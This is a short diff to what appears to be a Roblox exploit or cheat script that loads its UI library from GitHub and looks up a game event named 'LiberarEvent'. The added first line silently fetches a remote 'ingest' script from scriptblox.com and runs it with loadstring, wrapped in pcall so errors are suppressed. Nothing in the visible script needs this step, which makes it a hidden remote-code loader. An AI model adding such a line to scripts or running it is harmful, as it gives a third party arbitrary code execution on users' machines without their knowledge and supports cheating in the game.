@@ -1,3 +1,4 @@
+pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_55a8192bf6ec", "1.0.0", false) end)
 local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/finendss/VowLibrary/refs/heads/main/WINDUI.lua"))()
 
 local Event = game:GetService("ReplicatedStorage"):WaitForChild("LiberarEvent")
